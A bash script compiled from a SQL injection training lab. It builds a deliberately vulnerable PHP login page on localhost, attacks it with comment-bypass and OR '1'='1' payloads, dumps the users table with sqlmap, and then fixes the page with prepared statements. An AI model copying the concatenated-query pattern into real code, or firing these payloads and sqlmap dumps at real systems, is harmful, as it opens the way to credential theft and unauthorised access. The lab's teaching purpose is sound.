#!/usr/bin/env bash
# Lab 9 — SQL Injection (SQLi)
# Auto-assembled from the lab's command blocks. Review before running.
# Run on the Killercoda Ubuntu Playground: https://killercoda.com/playgrounds/scenario/ubuntu
set -uo pipefail

echo '=== block 1 ==='
apt update && apt install -y sqlite3 php-cli php-sqlite3 sqlmap

echo '=== block 2 ==='
mkdir -p /tmp/web && cd /tmp/web
sqlite3 users.db "CREATE TABLE users(u TEXT, p TEXT); INSERT INTO users VALUES('admin','s3cret'),('bob','bob');"

cat > login.php <<'EOF'
<?php
$db = new PDO('sqlite:users.db');
$u = $_GET['u'] ?? '';
$p = $_GET['p'] ?? '';
$q = "SELECT * FROM users WHERE u='$u' AND p='$p'";
echo "QUERY: $q\n";
foreach ($db->query($q) as $row) echo "WELCOME ".$row['u']."\n";
EOF

php -S 127.0.0.1:8080 -t . &
sleep 1

echo '=== block 3 ==='
curl -s "http://127.0.0.1:8080/login.php?u=admin&p=s3cret"
curl -s "http://127.0.0.1:8080/login.php?u=admin&p=wrong"

echo '=== block 4 ==='
curl -s "http://127.0.0.1:8080/login.php?u=admin'--&p=anything"

echo '=== block 5 ==='
curl -s "http://127.0.0.1:8080/login.php?u=x'+OR+'1'='1&p=x'+OR+'1'='1"

echo '=== block 6 ==='
sqlmap -u "http://127.0.0.1:8080/login.php?u=admin&p=x" --batch --dbs
sqlmap -u "http://127.0.0.1:8080/login.php?u=admin&p=x" --batch --dump -T users

echo '=== block 7 ==='
cat > login.php <<'EOF'
<?php
$db = new PDO('sqlite:users.db');
$stmt = $db->prepare("SELECT * FROM users WHERE u=:u AND p=:p");
$stmt->execute([':u'=>$_GET['u'] ?? '', ':p'=>$_GET['p'] ?? '']);
foreach ($stmt as $row) echo "WELCOME ".$row['u']."\n";
EOF

echo '=== block 8 ==='
curl -s "http://127.0.0.1:8080/login.php?u=admin'--&p=x"

